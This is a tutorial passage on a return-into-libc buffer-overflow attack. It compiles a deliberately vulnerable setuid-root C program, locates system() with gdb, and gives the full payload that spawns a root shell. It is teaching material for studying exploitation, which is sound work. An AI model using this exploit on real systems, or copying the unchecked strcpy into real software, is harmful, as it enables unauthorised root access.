One of the simplest libc functions to return into is system()
As you recall, this function takes a single argument and executes that argument with /bin/sh
This function only needs a single argument, which makes it a useful target
For this example, a simple vulnerable program will be used

vuln.c
__________________________________________________________________________________
int main(int argc, char *argv[])
{
   char buffer[5];
   strcpy(buffer, argv[1]);
   return 0;
}
__________________________________________________________________________________

Of course, this program must be compiled and setuid root before it's truly vulnerable

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -o vuln vuln.c
reader@hacking:~/booksrc $ sudo chown root ./vuln
reader@hacking:~/booksrc $ sudo chmod u+s ./vuln
reader@hacking:~/booksrc $ ls -l ./vuln
-rwsr-xr-x 1 root reader 6600 2007-09-30 22:43 ./vuln
__________________________________________________________________________________

The general idea is to force the vulnerable program to spawn a shell, without executing anything on the stack, by returning into the libc function system()
If this function is supplied with the argument of /bin/sh, this should spawn a shell

First, the location of the system() function in libc must be determined
This will be different for every system, but once the location is known, it will remain the same until libc is recompiled
One of the easiest ways to find the location of a libc function is to create a simple dummy program and debug it

__________________________________________________________________________________
reader@hacking:~/booksrc $ cat > dummy.c
int main()
{ system(); }

reader@hacking:~/booksrc $ gcc -o dummy dummy.c
reader@hacking:~/booksrc $ gdb -q ./dummy
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) break main
Breakpoint 1 at 0x804837a

(gdb) run
Starting program: /home/matrix/booksrc/dummy

Breakpoint 1, 0x0804837a in main ()

(gdb) print system
$1 = {<text variable, no debug info>} 0xb7ed0d80 <system>
__________________________________________________________________________________

Here, a dummy program is created that uses the system() function
After it's compiled, the binary is opened in a debugger and a breakpoint is set at the beginning
The program is executed, and then the location of the system() function is displayed
In this case, the system() function is located at 0xb7ed0d80

Armed with that knowledge, we can direct program execution into the system() function of libc
However, the goal here is to cause the vulnerable program to execute system("/bin/sh") to provide a shell, so an argument must be supplied
When returning into libc, the return address and function arguments are read off the stack in what should be a familiar format: the return address followed by the arguments
On the stack, the return-into-libc call should look something like this:

________________________________________________________________
|Function address| Return address | Arguemnt 1 | Argument 2 ...|
|________________|________________|____________|_______________|

         This is the format for a typical stack frame
         When the program attempts to return, the ESP will have reached the address of function address
         Then, the ESP points to the return address, like a typical stack frame

Directly after the address of the desired libc function is the address to which execution should return after the libc call
After that, all of the function arguments come in sequence

In this case, it doesn't really matter where the execution returns to after the libc call, since it will be opening an interactive shell
Therefore, these 4 bytes can just be a placeholder value of FAKE
There is only one argument, which should be a pointer to the string /bin/sh
This string can be stored anywhere in the memory; an environment variable is an excellent candidate
In the output below, the string is prefixed with several spaces
This will act similarly to a NOP sled, providing us with some wiggle room, since system("   /bin/sh") is the same as ("     /bi/sh")

__________________________________________________________________________________
reader@hacking:~/booksrc $ export BINSH="      /bin/sh"
reader@hacking:~/booksrc $ ./getenvaddr BINSH ./vuln
BINSH will be at 0xbffffe5b
__________________________________________________________________________________

So the system() address is at 0xb7ed0d80, and the address for the /bin/sh string will be 0xbffffe5b when the program is executed
That means the return address on the stack should be overwritten with a series of addresses, beginning with 0xb7ed0d80, followed by FAKE (since it doesn't matter where execution goes after the system() call), and concluding with 0xbffffe5b

A quick binary search shows that the return address is probably overwritten by the 8th word of the program input, so 7 words of dummy data are used for spacing the exploit

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./vuln $(perl -e 'print "ABCD"x5')
reader@hacking:~/booksrc $ ./vuln $(perl -e 'print "ABCD"x10')
Segmentation fault
reader@hacking:~/booksrc $ ./vuln $(perl -e 'print "ABCD"x8')
Segmentation fault

reader@hacking:~/booksrc $ ./vuln $(perl -e 'print "ABCD"x7')
Illegal instruction

reader@hacking:~/booksrc $ ./vuln $(perl -e 'print "ABCD"x7 . "\x80\x0d\xed\xb7FAKE\x5b\xfe\xff\xbf"')
sh-3.2# whoami
root
sh-3.2#
__________________________________________________________________________________

The exploit can be expanded upon by making chained libc calls, if needed
The return address of FAKE used in the example can be changed to direct program execution
Additional libc calls can be made, or execution can be directed to some other useful section in the program's existing instructions